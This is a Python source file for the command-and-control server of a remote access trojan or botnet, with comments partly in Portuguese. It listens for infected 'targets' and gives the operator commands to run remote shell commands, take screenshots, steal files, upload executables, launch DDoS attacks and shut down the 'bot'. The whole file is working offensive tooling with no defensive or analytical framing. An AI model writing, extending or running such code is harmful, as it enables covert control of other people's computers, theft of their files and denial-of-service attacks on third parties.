import socket
import sys, time
import os
# create socket

def socket_create():
	try:
		global host
		global port
		global s
		host = ''
		port = 9999
		s = socket.socket()
	except socket.error as msg:
		print("Socket creation error: " + str(msg))
# bind socket to port and wait for connection 

def socket_bind():
	try:
		global host
		global port
		global s
		print("Bindding socket to port: " + str(port))
		s.bind((host,port))
		s.listen(5)
	except socket.error as msg:
		print("Socket binding error: " + str(msg) + "\n" + "Retrying...")
		socket_bind()

# Establish a connection with client(socket must be listening)
def socket_accept():
	conn, address = s.accept()
	print("Connection has been established | " + "IP: " + address[0] + " | PORT: " +str(address[1]))
	send_commands(conn)
	conn.close()
def send_commands(conn):
	function = ['shell','help','ddos','download','print','upload']
	while True:
		cmd = input(':')
		if cmd == 'quit':
			conn.send(str.encode(cmd))
			conn.close()
			s.close()
			sys.exit()
		if cmd == 'help':
			print("commands\
					\nshell: Open a shell to send commands to the target\
					\nprint: Take a screenshot of the target\
					\ndownload: Download some file of the target Example: '/path/to/the/file/file.txt'\
					\nupload: Upload some file to the target Example: '/path/to/the/file/tosend.exe'\
					\nddos: Make a DDos using the target or all targets!\
					\n\nControl:\
					\nquit: turn off server but target still on!\
					\nexit: close shell but target still on!\
					\nclose: close the target process(turn off the bot)\
					\nhelp: show that message!")
		if cmd == 'clear':
			os.system("clear")
		if cmd == 'print':
			conn.send(str.encode(cmd))
			prints(conn)
		if cmd == 'download':
					conn.send(str.encode('download'))
					filename = input("Filename: ")		
					conn.send(str.encode(filename))
					download(conn,filename) 
		if cmd == 'ddos':
			conn.send(str.encode('ddos'))
			target = input("Target: ")
			conn.send(str.encode(target))
			port = input("Port: ")
			conn.send(str.encode(port))		
		if cmd == 'reset':
			conn.send(str.encode('quit'))
			conn.close()
			main()
		if cmd == 'upload':
			upload(conn)
		if len(str.encode(cmd)) > 0 and cmd not in function:
			try:
				conn.send(str.encode(cmd))
				client_response = str(conn.recv(1024), "utf-8")
				print(client_response, end="")
			except:
				print("No possible send and receive data!")
		if cmd == 'exit':
					conn.send(str.encode('exit')) 
					print("\n\n")
##Functions of the server!
	
def prints(conn):
	f = open('print.png', 'wb')
	data = conn.recv(10000000)
	f.write(data)
	send_commands(conn)
def download(conn,filename):
	data = conn.recv(1024)
	resposta = data.decode("utf-8")
	if resposta.find("EXISTS") != -1:
		filesize = int(data[6:])
		print("Funciona melhor com arquivos de texto! outros tipos de arquivos pode haver algum tipo de conflito\
				e pode crashar!")
		message = input("Deseja baixar? " + str(filesize) + "Bytes. [Y/N]: " )
		if message == "Y":
			conn.send(str.encode('OK'))
			f = open(os.path.join(filename), 'w')
			data = conn.recv(1024)
			totalRecv = len(data)
			dados = data.decode("utf-8")
			print("Escrevendo dados...")
			f.write(dados)
			print("Dados escritos!")
			f.close()
			while totalRecv < filesize:
				data = conn.recv(1024)
				totalRecv += len(data)
				f.write(data)
			print("Download complete!")
	else:
		print("File no exist!")
	send_commands(conn)
		
def upload(conn):
	arquivo = input("Directory of file\n: ")
	if os.path.isfile(arquivo):
		print("File exists! with " + str(os.path.getsize(arquivo)))
		question = input("Do you want to send? [Y/N]\n: ")
		while True:
			if question == 'Y' or question == 'y':
				with open(arquivo, 'rb') as f:
					bytestosend = f.read()
					conn.send(bytestosend)
					f.close()
					print("Arquivo enviado!")
					send_commands(conn)
					break
			elif question == 'N' or question =='n':
				print("Done!\n")
				send_commands(conn) 
			else:
				print("Type the right answer!")
				
						
def main():
	socket_create()
	socket_bind()
	socket_accept()
main()
		
